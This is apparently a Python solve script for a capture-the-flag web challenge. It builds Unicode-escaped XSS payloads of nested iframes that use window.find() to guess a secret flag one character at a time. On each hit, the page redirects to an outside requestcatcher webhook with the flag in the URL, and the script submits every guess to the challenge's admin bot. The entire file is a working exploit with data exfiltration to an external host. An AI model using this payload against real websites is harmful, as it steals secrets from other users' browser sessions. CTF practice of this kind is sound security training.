import requests
import string

def to_unicode_escape(text):
    return ''.join(f'\\u{ord(c):04x}' if c not in string.ascii_lowercase + string.ascii_uppercase else c for c in text)

def setup_redirect_with_flag(flag, webhook):
    html = f"""<iframe srcdoc="<script>top.parent.document.location.href='{webhook}?{flag}'</script>">"""
    return html

def generate_payload(localflag, webhook):
    html = f"""<iframe srcdoc="
    <script>
    const flag_prefix = window.parent.find('{localflag}');
    console.log(flag_prefix);
    if(flag_prefix){{
        top.parent.parent.document.body.innerHTML= '{to_unicode_escape(setup_redirect_with_flag(localflag, webhook))}';
    }}
    </script>
    ">"""
    html = html.replace("\n","")
    data = {
        "payload":to_unicode_escape(html)
    }
    return data

def send_to_bot(url, data, localflag):
    print(f"Testing with {localflag}", end =" ==> ")
    res = requests.post(url + "/visit", json=data)
    print(res.text)

def main():
    flag = "TRX{" # TRX{1_l0v3_d3p  unfinished flag :)
    url =  "" or "http://localhost:1337" # Challenge Url
    webhook = "https://testingwkwk.requestcatcher.com/" # your webhook
    
    # Bruteforcing...
    for char in '_' + string.digits + string.ascii_letters:
        localflag = flag + char
        data = generate_payload(localflag, webhook)
        send_to_bot(url, data, localflag)
    
if __name__ == "__main__":
    main()
